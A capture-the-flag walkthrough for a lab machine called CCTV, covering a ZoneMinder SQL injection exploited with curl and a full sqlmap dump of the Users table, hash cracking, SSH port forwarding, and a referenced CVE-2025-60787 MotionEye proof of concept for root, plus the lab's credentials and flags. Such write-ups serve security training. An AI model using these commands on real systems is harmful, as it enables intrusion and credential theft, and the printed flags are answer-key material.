+++
title = "CCTV - Walkthrough"
date = "2026-07-12"
author = "nvru"
description = "Walkthrough for the CCTV machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "http",
  "sql-injection",
  "ssh",
  "privilege-escalation"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.14.24`
- **Target Machine IP:** `10.129.50.93`

The objective was to enumerate the target, identify exposed services, gain initial access through a SQL injection vulnerability in ZoneMinder, and escalate privileges by exploiting a vulnerable MotionEye instance.

![Machine information](/images/htb/cctv/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.129.50.93 -- -A -oA nmap/rust
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
```

Only a few services were exposed externally, making web enumeration the next logical step.

---

## Enumeration

### HTTP

Browsing the target redirected all requests to `cctv.htb`, so I added the hostname to `/etc/hosts`.

![Hosts file](/images/htb/cctv/hosts.png)

The website appeared to belong to a security company.

![Homepage](/images/htb/cctv/http.png)

While browsing, I found a **Staff Login** button that redirected to:

```text
http://cctv.htb/zm/
```

![Staff login](/images/htb/cctv/staff_log_butt.png)

The login portal was powered by **ZoneMinder**, an open-source video surveillance platform.

![ZoneMinder login](/images/htb/cctv/zm_default.png)

---

### ZoneMinder SQL Injection

The login page did not disclose the application version, so I first tried the default credentials:

```text
admin:admin
```

They worked, allowing access to the dashboard.

Once authenticated, I confirmed the installed version.

```text
ZoneMinder v1.37.63
```

![Version](/images/htb/cctv/version.png)

Searching for vulnerabilities affecting this version revealed a Boolean-based SQL Injection vulnerability.

**Reference**

- https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3

The advisory included a proof of concept.

![PoC](/images/htb/cctv/poc_zm.png)

Testing the vulnerable endpoint confirmed the issue.

```bash
curl --cookie "ZMSESSID=<session>" \
"http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1"
```

![curl PoC](/images/htb/cctv/curl.png)

---

### Dumping Credentials

The advisory also provided a ready-to-use `sqlmap` command.

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1"
```

Enumeration was extremely slow, so I manually enumerated the database before dumping the user credentials.

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--batch \
--risk=3 \
--level=5 \
--cookie="ZMSESSID=<session>" \
--dbms=MySQL \
-D zm \
-T Users \
-C Id,Username,Password \
--dump
```

The password hashes were successfully extracted.

![Hashes](/images/htb/cctv/hases.png)

I cracked them with John the Ripper.

```bash
john --wordlist=~/wordlists/rockyou.txt creds/hashes
```

One of the hashes produced valid SSH credentials.

```text
mark:opensesame
```

---

## Initial Access

SSH was the only exposed remote login service, so I authenticated with the recovered credentials.

```text
Username: mark
Password: opensesame
```

The login was successful.

![SSH login](/images/htb/cctv/ssh_mark.png)

---

## Privilege Escalation

### mark → sa_mark

The first thing I checked was the user's sudo privileges.

```bash
sudo -l
```

No sudo permissions were available.

I also checked Mark's home directory but found nothing useful. While enumerating other users, I noticed the `sa_mark` home directory, although I didn't have permission to access it.

![Permission denied](/images/htb/cctv/no_perm_sa_mark.png)

---

### Internal Services

Continuing manual enumeration, I found two interesting directories.

```text
/opt/containerd
/opt/video
```

I couldn't access `containerd`, but `/opt/video/backups` contained a `server.log` file that didn't reveal anything useful.

![Opt directory](/images/htb/cctv/opt.png)

Next, I checked for listening services.

Besides SSH and MySQL, two internal ports stood out.

![Open ports](/images/htb/cctv/intr_ports.png)

```text
8765
8554
```

Port `8765` responded to HTTP requests, so I forwarded it over SSH.

```bash
ssh -f -N -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Browsing to `http://127.0.0.1:8765` revealed a **MotionEye** instance.

![MotionEye](/images/htb/cctv/motion_eye..png)

---

### MotionEye Enumeration

Mark's credentials did not work on MotionEye.

After some research, I found that MotionEye stores its configuration in:

```text
/etc/motioneye
```

Inside the configuration, I recovered the administrator credentials.

![Recovered credentials](/images/htb/cctv/found_creds_motion.png)

Logging in with the recovered credentials was successful.

![MotionEye login](/images/htb/cctv/log_motion.png)

Inspecting the page source revealed the installed version.

```text
0.43.1b4
```

![MotionEye version](/images/htb/cctv/motions_version.png)

Searching for public exploits returned an entry in Searchsploit.

![Searchsploit](/images/htb/cctv/searchsploit.png)

The Searchsploit entry was only a text advisory, and the Metasploit module was unsuccessful.

![Metasploit](/images/htb/cctv/msf.png)

Further research led to a working GitHub proof of concept.

- https://github.com/gunzf0x/CVE-2025-60787/

Running the exploit resulted in a root shell.

![Root shell](/images/htb/cctv/exploit_root.png)

---

### Post Exploitation

After obtaining root access, I revisited the `sa_mark` home directory.

It contained a document named:

```text
SecureVision Staff Announcement.pdf
```

The document simply announced the company's migration to ZoneMinder and contained no additional credentials or sensitive information.

![Announcement](/images/htb/cctv/announce.png)

---

## Credentials

```text
SSH
mark:opensesame

MotionEye
Username: admin
Password: 989c5a8ee87a0e9521ec81a79187d162109282f0
```

---

## Flags

```text
user:1ec7dbd764842955dbc82eb589f5195b

root:c6972ae0eed4ce229535139e6c8f9aa9
```
